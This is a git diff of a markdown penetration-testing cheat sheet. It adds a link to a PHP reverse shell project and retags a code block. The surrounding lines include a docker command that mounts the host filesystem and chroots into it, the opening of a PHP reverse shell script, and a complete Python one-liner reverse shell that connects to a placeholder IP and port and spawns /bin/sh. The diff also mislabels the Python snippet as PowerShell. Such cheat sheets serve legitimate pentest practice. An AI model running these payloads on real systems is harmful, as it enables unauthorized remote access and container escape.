@@ -77,6 +77,8 @@ docker run -it -v /:/host/ <docker image> chroot /host/ bash
 
 ### PHP Reverse Shell
 
+* [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
+
 ```php
 <?php
 set_time_limit (0);
@@ -193,9 +195,10 @@ function printit ($string) {
 ?>
 ```
 
+
 ### Python Reverse Shell
 
-```python
+```powershell
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
